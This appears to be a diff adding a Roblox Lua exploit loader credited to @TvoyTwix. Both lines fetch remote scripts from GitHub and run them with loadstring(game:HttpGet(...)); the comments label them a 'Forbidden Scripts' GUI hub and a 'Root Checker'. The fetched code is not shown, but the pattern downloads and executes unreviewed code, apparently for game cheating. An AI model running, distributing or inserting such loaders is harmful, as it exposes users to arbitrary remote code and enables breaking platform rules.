@@ -1,0 +1,4 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/tbiGuiHub/refs/heads/main/Adm',true))() -- Forbidden Scripts | tbiGui
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/Loader/refs/heads/main/2025',true))() -- Root Checker
+
+-- Script ver 1.0 (@TvoyTwix)
